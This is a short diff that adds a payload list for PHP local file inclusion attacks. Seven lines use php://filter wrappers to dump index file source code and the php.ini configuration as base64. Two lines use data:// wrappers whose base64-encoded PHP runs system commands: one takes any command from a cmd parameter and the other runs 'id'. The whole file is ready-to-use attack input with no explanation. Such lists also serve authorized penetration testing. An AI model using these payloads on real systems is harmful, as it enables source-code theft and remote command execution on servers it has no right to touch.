@@ -1,0 +1,9 @@
+php://filter/read=convert.base64-encode/resource=index
+php://filter/read=convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=index.html
+php://filter/read=convert.base64-encode/resource=index.shtml
+php://filter/read=convert.base64-encode/resource=index.asp
+php://filter/read=convert.base64-encode/resource=index.aspx
+php://filter/read=convert.base64-encode/resource=/etc/php/7.4/apache2/php.ini
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
+data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
